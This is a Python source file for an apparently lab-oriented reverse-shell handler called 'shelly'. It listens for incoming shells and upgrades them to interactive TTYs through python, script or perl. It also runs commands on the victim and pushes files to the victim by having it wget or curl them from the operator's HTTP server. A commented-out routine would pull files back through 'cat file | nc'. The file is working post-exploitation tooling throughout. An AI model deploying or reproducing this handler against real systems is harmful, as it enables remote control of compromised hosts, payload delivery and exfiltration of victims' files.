import sys
import socket
import getopt
import threading
import subprocess
import readline
import time
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from lib.palette import colorize as C
from lib.animation import Loading
from lib.logger import Logger

UPLOAD_PORT = 8000
DOWNLOAD_PORT = 8001
LOCAL_IP = "10.10.16.13" # "127.0.0.1"

helpBanner = '''shelly> <command> [options] 

commands:
  help, ?
  ls
  cd
  pwd
  shell
  upload
'''

log = Logger()

class FileUpload(BaseHTTPRequestHandler):
	def do_GET(self):
		try:
			with open(self.path[1:], 'rb') as file:
				content = file.read()
				self.send_response(200)
				self.end_headers()
				self.wfile.write(content)
				log.success("File uploaded successfully")
						
		except Exception as e:
			log.error("File not Found")

class Netcat:
	def __init__(self):
		
		self.ans = ''
		self.command = None
		self.waiting = False
		self.TO = 0.5

		self.commands = {
			'ls': lambda args: self.exec('ls ' + args),
			'cd': lambda args: self.exec('cd ' + args),
			'pwd': lambda args: self.exec('pwd ' + args),
			'id': lambda args: self.exec('id ' + args),
			'shell': lambda args: self.shell(),
			'clear': lambda args: self.clear(),
			'upload': lambda args: self.upload(args),
			# 'download': lambda args: self.download(args),
			'exit': lambda args: self.exit(),
			'help': lambda args: self.help()
		}

		self.history_index = 0
		self.history_files = [".main_history", ".shell_history"]
		self.max_history_length = 100

		self.load_history(self.history_files[self.history_index])

	def load_history(self, file):
		try:
			readline.read_history_file(file)
		except FileNotFoundError:
			log.warn("Loading history file filed!")

	def save_history(self, file):
		readline.write_history_file(file)

	def switch_history(self):
		readline.clear_history()
		self.history_index = not self.history_index
		self.load_history(self.history_files[self.history_index])

	def Recv(self):
		self.ans = ''
		try:
			while True:
				data = self.sock.recv(1024).decode()
				if not data:
					break
				self.ans += data
		except:
			pass

		return self.ans

	def Send(self, command):
		self.command = command
		self.command += b"\n"
		self.sock.sendall(self.command)

	def listen(self, loopback='0.0.0.0', port=1234):
		self.port = port
		self.loopback = loopback
		
		try:
			server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			server.bind((self.loopback, self.port))
			server.listen(5) # no need for multiple connections at the same time for now !! 
		
			thr = Loading("Listening on port " + C(str(self.port), "cyan", 'bold'));

			self.sock, self.target = server.accept()
			thr.stop();

			print("")
			log.info(f'Connection received from {self.target}')

			log.info(f'Your local IP address {LOCAL_IP}')
			
			if self.target == '127.0.0.1' or self.target == '0.0.0.0':
				self.TO = 0.10
			self.sock.settimeout(self.TO)

		except KeyboardInterrupt:
			thr.stop();
			print("\nBye!!")
			exit(0)

	def MyInput(self):
		pass

	def help(self):
		print(helpBanner)

	def exit(self):
		while True:
			try:	
				i = input("Are you sure you wanna exit [Y/n] ? ")
				if i.rstrip() == "Y" or i.rstrip() == "y":
					self.Send(b'\x03')
					self.sock.close()
					print("\nBye!!")
					exit(1)
				else:
					break

			except KeyboardInterrupt:
				print("")
				continue

	def clear(self):
		subprocess.run(['clear'], shell=True)

	def shell(self):
		self.switch_history()
		self.Send(b'')

		while True:
			try:
				i = input('\n'.join(self.Recv().split('\n')[1:]))
				if (not i): 
					# print("")
					self.Send(b'')
					continue

				if i.strip() == 'back': 
					self.switch_history()
					break
				
				if i.strip() == 'exit': 
					self.exit()
					continue

				with open(self.history_files[self.history_index], 'a') as f:
					f.write(i + '\n')

				self.Send(i.encode())
			except KeyboardInterrupt:
				self.Send(b'\x03')
			except EOFError:
				self.Send(b'\x04')
				# print("\n[*] Going back to shelly ")

	# def download(self, filepath, download_port=DOWNLOAD_PORT, local_ip=LOCAL_IP):
	# 	# try:
	# 	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# 	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	# 	server.bind((self.loopback, download_port))
	# 	server.listen(1) # no need for multiple connections at the same time for now !! 

	# 	sock, address = server.accept()

	# 	self.Send(f"cat {filepath} | nc {local_ip} {download_port}".encode())
	# 	# sock.settimeout(self.TO)

	# 	filename = filepath.rstrip("/").split('/')[-1]
	# 	with open(filename, 'wb') as file:
	# 		self.Recv()
	# 	# time.sleep(2)

	# 	self.Recv()
	# 	# except:
	# 	# 	pass

	def upload_server(self):
		try:
			host = LOCAL_IP
			port = 8000
			server = HTTPServer((host, port), FileUpload)
			log.info(f'Server started on http://{host}:{port}')
			server.handle_request()
			self.Recv()
		except Exception as e:
			log.error(e)

	def upload(self, filepath, upload_port=UPLOAD_PORT, local_ip=LOCAL_IP):
		# try:
		path, filename = os.path.split(filepath) 
		os.chdir(os.path.expanduser(path if path else "."))
		log.info(f"""Trying to upload \"{filename}\" from { f'"{path}"' if (path and path != '.') else 'the current directory'} to \"/tmp\"""")
		thr = threading.Thread(target=self.upload_server)
		thr.start()

		self.Recv()

		if "wget" in self.exec("which wget", hidden=True):
			self.Send(f"wget -P /tmp http://{local_ip}:{upload_port}/{filename}".encode())
		elif "curl" in self.exec("which curl", hidden=True):
			self.Send(f"curl http://127.0.0.1:8000/{filename} > {filename}".encode())
		else:
			log.warn("wget and curl are not found")

		thr.join(10) # timeout
		self.Recv() # flush stdout

	def exec(self, command, hidden=False):
		self.Send(command.encode())
		R = '\n'.join(self.Recv().split('\n')[1:-1])
		if not hidden:
			print(R, end='\n')
			# if R:
			# else:
			# 	print(R, end='')

		return R

	def tty(self):
		self.Recv()
		
		if "python3" in self.exec("which python3", hidden=True):
			self.Send(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")';")
			log.success("Spawning TTY shell using 'python3'")

		elif "python" in self.exec("which python", hidden=True):
			self.Send(b"python -c 'import pty; pty.spawn(\"/bin/bash\")';")
			log.success("Spawning TTY shell using 'python'")
		
		elif "script" in self.exec("which script", hidden=True):
			self.Send(b"script -qc /bin/bash /dev/null;")
			log.success("Spawning TTY shell using 'script'")

		elif "perl" in self.exec("which perl", hidden=True):
			self.Send(b"perl -e 'exec \"/bin/sh\";';")
			log.success("Spawning TTY shell using 'perl'")
		
		else:
			log.warn("Failed spawning bash shell, enjoy ^^")
			
		self.Send(b"export SHELL=bash; export TERM=xterm; export LS_OPTIONS='--color=auto'; eval \"`dircolors`\"; alias ls='ls $LS_OPTIONS'")
		self.Send(b"magenta=$(tput setaf 5); blue=$(tput setaf 4); reset=$(tput sgr0)")
		self.Send(b"export PS1='[\\[$magenta\\]\\u\\[$reset\\]@\\[$magenta\\]\\h\\[$reset\\]:\\[$blue\\]\\w\\[$reset\\]]\\$ '")

		self.Recv() # flush stdout

	def interact(self):
		self.tty()

		while True:
			try:
				i = input(C("shelly> ", 'white', 'bold'))
				cmd = i.split()

				if not cmd:
					continue

				command = cmd[0]
				args = " ".join(cmd[1:])

				with open(self.history_files[self.history_index], 'a') as f:
					f.write(i + '\n')
				# self.command_history.append(i)

				if command in self.commands:
					self.commands[command](args)
				else:
					log.error(f"Command \"{command}\" not found")

			except KeyboardInterrupt:
				print("")
				self.exit()